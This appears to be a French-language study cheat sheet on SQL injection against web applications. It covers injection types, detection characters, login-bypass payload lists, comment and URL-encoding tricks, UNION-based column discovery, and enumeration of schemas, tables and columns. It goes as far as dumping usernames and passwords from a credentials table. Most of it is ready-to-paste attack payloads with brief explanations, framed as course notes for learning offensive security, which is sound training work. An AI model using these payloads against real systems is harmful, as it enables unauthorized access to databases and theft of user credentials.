# SQL Injections (SQLI)

## SQL en WebApp : contexte classique

- Les apps web utilisent SQL pour gérer les utilisateurs, posts, recherches, etc.
- L’input utilisateur est souvent inséré dans les requêtes SQL :
  - PHP/MySQL typique :
    ```php
    $searchInput = $_POST['findUser'];
    $query = "SELECT * FROM logins WHERE username LIKE '%$searchInput'";
    ```
- Danger : si l’input n’est pas filtré → **injection possible**.

## Types de SQLI (principaux)

- **In-band (Résultat visible directement)**  
- **Union-based** : récupération de données via UNION SELECT.
- **Error-based** : exploitation des messages d’erreur SQL renvoyés.

- **Blind (Résultat invisible, il faut deviner ou forcer le comportement)**  
- **Boolean-based** : test de conditions VRAI/FAUX pour extraire info (ex: page différente selon le résultat).
- **Time-based** : utilisation de SLEEP() pour détecter via délai (ex: page lente = requête vraie).

- **Out-of-band**  
- Exfiltration hors bande (DNS, HTTP, etc) – rare, utile si aucune sortie exploitable.

## Détection rapide SQLI

- **Tester :** `' " ) ( ; -- # /*`
- **Rechercher des erreurs SQL dans la réponse**
- **Vérifier si l’input ressort dans la page, ou si le comportement de la page change**
- **Injecter une condition toujours vraie** (`' OR 1=1 -- -`)  
- **Injecter une condition toujours fausse** (`' AND 1=2 -- -`)  

# SQLi Subverting Query Logic & Auth Bypass

## Objectif

- Modifier la logique d'une requête SQL pour bypass l’auth, obtenir accès, etc.
- S’appuyer sur l’**OR** et les **commentaires SQL** pour forcer une condition toujours vraie.

## Découverte de vulnérabilité

- **Injecter des caractères spéciaux dans le form** (username/password) pour détecter une erreur SQL :
    - `'`
    - `"`
    - `#`
    - `;`
    - `)`
- Si une **erreur SQL** apparaît : la requête est probablement vulnérable.

## Auth Bypass – Payloads classiques

### 1. Username ou Password, injection basique

`' or '1'='1`

- Permet de transformer la requête :
    ```
    SELECT * FROM logins WHERE username='<input>' OR '1'='1' AND password='<input>';
    ```
- La condition `'1'='1'` rend la requête toujours vraie.

### 2. Username + password = bypass total

- Username : `' or '1'='1`
- Password : `' or '1'='1`
- Résultat : accès sans username/pass valide.

### 3. Username only (si le champ password est ignoré par la logique)

- Username : `admin' -- `
- Password : (n’importe quoi)
- Requête résultante :
    ```
    SELECT * FROM logins WHERE username='admin' -- ' AND password='xxx';
    ```
- Le commentaire (`--`) annule le reste de la requête.

### 4. Utiliser les commentaires pour éviter les erreurs de syntaxe

- Ajouter : `-- -` ou `#` ou `/*` à la fin du payload pour commenter le reste.
- Exemples :
    - `admin' or '1'='1' -- -`
    - `' or 1=1#`
    - `" or ""="`

### 5. Auth bypass (sans user connu)

- Username : `' or 1=1 -- `
- Password : (n’importe quoi)
- Ou Username : ` ' OR TRUE -- - `
- Permet de bypasser même si aucun login n’est connu.

## Astuces pratiques

- **Toujours tester avec/et sans espaces, guillemets simples/doubles, commentaires.**
- Tester les deux champs (user et pass), certains sites ne vérifient pas les deux !
- Si l’app encode l'input, essayer la version encodée :
    - `'` = `%27`
    - `"` = `%22`
    - `#` = `%23`
- Si message d’erreur SQL : vulnérabilité probable !

## Liste de payloads à tester

- `' or '1'='1`
- `admin' -- `
- `admin' #`
- `admin'/*`
- `' or 1=1 -- -`
- `' or 1=1#`
- `" or ""="`
- `') or ('1'='1'--`
- `') or ('a'='a`
- `' or 1=1 limit 1 -- -`

# SQLi : Utilisation des commentaires

## Comments en SQL

- **Deux formats principaux sur MySQL** :
  - `-- ` (deux tirets + espace) → tout ce qui suit est ignoré
  - `#` (dièse) → tout ce qui suit est ignoré
  - `/* ... */` (inline/multi-ligne, rarement utile en injection simple)

## Auth Bypass : Payloads classiques avec commentaires

### Username : `admin'-- -`
- Requête résultante :

- `SELECT * FROM logins WHERE username='admin'-- ' AND password='xxx';`

- **Le reste de la requête (AND password...) est ignoré !**

### Version avec dièse (utile si espace mal filtré)

- Username : `admin'#`
- (En URL : `admin'%23`)

### Astuce : l’espace après `--`

- SQL attend toujours un espace après `--` pour activer le commentaire
- Si on injectes dans une URL, encoder l’espace : `--+` (car `+` = espace en URL)

### Pour balancer la parenthèse si besoin

- Quand la requête comporte des parenthèses, il faut parfois les fermer dans le payload :
  - Username : `admin')-- -`
  - Résultat :
      ```
      SELECT * FROM logins WHERE (username='admin')-- - ...`
      ```

## Récapitulatif des payloads utiles

- `admin'-- -`
- `admin'#`
- `admin')-- -`
- `admin')#`
- `' or '1'='1'-- -`
- `' or 1=1#`
- (En URL : remplacer `#` par `%23`, espace par `+`)

## Astuces pratiques

- **Tester avec espace, +, encodage URL, parenthèses fermées ou non**
- Pour GET : encode `#` en `%23` sinon le navigateur le gère comme ancre
- Toujours adapter au contexte SQL (regarde bien les parenthèses)
- Si erreur de syntaxe : ajuste le nombre de quotes ou de parenthèses

# CUnion Clause (Union-based Injection)

## Principe

L’injection UNION permet de fusionner le résultat d’une requête de l’appli avec tes propres requêtes SQL.
Permet de récupérer des données d’autres tables : users, passwords, emails…

### Syntaxe SQL Union
```
SELECT col1, col2 FROM table1
UNION
SELECT colA, colB FROM table2;
```
Les noms/nbre de colonnes et types de données doivent correspondre.

## Union-based Injection : Méthode pratique
### 1. Trouver le nombre de colonnes

  Tester différentes valeurs jusqu’à erreur :

   - `' ORDER BY 1-- -`

   - `' ORDER BY 2-- -`

   - `' ORDER BY 3-- -`

   (continuer jusqu’à erreur)

Dès qu’il y a une erreur : tu as trouvé le nombre max de colonnes affichées.

### 2. Trouver la structure correcte pour le UNION

  Injecter :

   - `' UNION SELECT 1-- -`

   - `' UNION SELECT 1,2-- -`

   - `' UNION SELECT 1,2,3-- -`

        ...jusqu’à voir la page s’afficher sans erreur.

  Quand la page s’affiche normalement, on a le bon nombre de colonnes.

### 3. Identifier la colonne affichée (reflected)

  Injecte des valeurs visibles :

   - `' UNION SELECT 111,222-- -`

   - `' UNION SELECT 111,'abc'-- -`

   Regarder sur la page si on vois “111” ou “abc”.

   Utiliser cette colonne pour afficher qu'on veux exfiltrer.

## Exemples de payloads Union-based

  - `' UNION SELECT 1,2-- -`

  - `' UNION SELECT username, password FROM users-- -`

  - `' UNION SELECT table_name, NULL FROM information_schema.tables-- -`

  - `' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'-- -`

  - `' UNION SELECT username, 2, 3 FROM users-- -`
    

# Union Injection

## 1. Détection de vulnérabilité

`'`:  
Tester si une erreur SQL apparaît (détection rapide de vulnérabilité SQLi).

## 2. Découverte du nombre de colonnes

`' order by 1-- -`:  
Tester si la colonne 1 existe.

`' order by 2-- -`:  
Tester si la colonne 2 existe.

`' order by 3-- -`:  
Tester si la colonne 3 existe.

`' order by 4-- -`:  
Tester si la colonne 4 existe.

`' order by 5-- -`:  
Erreur : nombre de colonnes atteint (celle-ci n’existe pas).

## 3. Découverte du nombre de colonnes via UNION

`cn' UNION select 1,2,3-- -`:  
Tester une injection UNION avec 3 colonnes.

`cn' UNION select 1,2,3,4-- -`:  
Tester une injection UNION avec 4 colonnes (essaie jusqu’à succès).

## 4. Déterminer les colonnes affichées

`cn' UNION select 1,2,3,4-- -`:  
Permet de voir quelles colonnes s’affichent à l’écran (ex : si tu vois “2, 3, 4”, ce sont les colonnes affichées).

## 5. Tester l’affichage de données spécifiques

`cn' UNION select 1,@@version,3,4-- -`:  
Affiche la version de la base de données si la colonne 2 est visible.

## 6. Récupération d’informations de base

`cn' UNION select 1, database(), 3, 4-- -`:  
Affiche le nom de la base de données active.

`cn' UNION select 1, user(), 3, 4-- -`:  
Affiche le nom d’utilisateur SQL courant.

`cn' UNION select 1, group_concat(table_name), 3, 4 from information_schema.tables where table_schema=database()-- -`:  
Liste toutes les tables de la base courante.

`cn' UNION select 1, group_concat(column_name), 3, 4 from information_schema.columns where table_name='NOM_DE_LA_TABLE'-- -`:  
Liste toutes les colonnes de la table ciblée (remplace NOM_DE_LA_TABLE).

## 7. Récupérer les données d’une table

`cn' UNION select 1, group_concat(col1,0x3a,col2), 3, 4 from NOM_DE_LA_TABLE-- -`:  
Affiche les valeurs des colonnes (remplace col1, col2, et NOM_DE_LA_TABLE).

## 8. Astuces diverses

`' OR 1=1-- -`:  
Bypass simple d’un login si la requête n’est pas protégée.

`' AND 1=0-- -`:  
Force la requête à retourner aucun résultat.

`' UNION SELECT NULL, NULL, NULL, NULL-- -`:  
Pour les requêtes où les champs ne peuvent pas être des entiers, utiliser NULL comme joker.

# Database Enumeration

## 1. Fingerprinting du SGBD (identifier MySQL)

`cn' UNION select 1,@@version,3,4-- -`:  
Affiche la version du SGBD, permet d’identifier MySQL/MariaDB.

`cn' UNION select 1,POW(1,1),3,4-- -`:  
Retourne 1 sur MySQL, erreur sur d’autres SGBD (test numérique discret).

`cn' UNION select 1,SLEEP(5),3,4-- -`:  
Fait “dormir” la requête 5 secondes (test de time-based pour MySQL).

## 2. Énumérer les bases de données (databases)

`cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -`:  
Affiche toutes les bases de données présentes sur le serveur.

`cn' UNION select 1,database(),3,4-- -`:  
Affiche la base de données actuellement utilisée par l’application.

## 3. Énumérer les tables dans une base

`cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -`:  
Liste toutes les tables de la base “dev” (remplace “dev” selon la base)

## 4. Énumérer les colonnes dans une table

`cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -`:  
Liste toutes les colonnes de la table “credentials” (remplace par le nom de la table à cibler).

## 5. Dumper les données d’une table spécifique

`cn' UNION select 1,username,password,4 from dev.credentials-- -`:  
Affiche les valeurs des colonnes “username” et “password” de la table “credentials” de la base “dev”.

## 6. Exemples génériques pour s’adapter à n’importe quelle table

`cn' UNION select 1,<colonne1>,<colonne2>,4 from <db>.<table>-- -`:  
À adapter selon les noms de colonnes, base et table trouvés via l’énumération.

## 7. Notes & Astuces

- Ignorer les bases “mysql”, “information_schema”, “performance_schema”, “sys” sauf cas particulier (elles sont par défaut).
- Utiliser toujours le point `.` pour préciser une table d’une autre base que celle courante : `<db>.<table>`.
- Remplacer les colonnes de la requête par celles effectivement affichées sur le site cible.
- On peux concaténer plusieurs colonnes avec `CONCAT(col1, ':', col2)` ou `group_concat()` si besoin d’afficher tout sur une ligne



## Ressources

- [PayloadAllTheThings – Authentication Bypass SQLI](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/README.md#authentication-bypass)


